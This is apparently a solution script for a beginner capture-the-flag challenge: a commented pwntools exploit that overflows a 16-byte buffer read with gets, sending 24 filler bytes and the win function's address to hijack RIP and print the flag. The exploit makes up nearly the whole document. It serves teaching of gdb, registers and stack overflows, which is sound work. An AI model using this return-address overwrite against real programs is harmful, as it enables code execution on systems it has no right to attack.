# The challenge involves a buffer of size 16 with an input field using gets. The exploit requires the attacker to overwrite RIP to point to a win function that prints the flag.

# 24 random characters need to be input followed by the address of the win function. The win function can be found when running the program and looking at the output or by 
# using elf.symbols. This address wont change every time the program is run.

# The challenge teaches the basics of gdb, the RSP and RIP registers and using pwntools for exploits.

from pwn import *

elf = ELF('./plzwin')
p = process('./plzwin')
#p = connect('ipaddress', port)

winaddr = elf.symbols['win']

payload = b''
payload += b'A'*24
payload += p64(winaddr)

p.sendlineafter('input?\n', payload)

print(p.recvall())
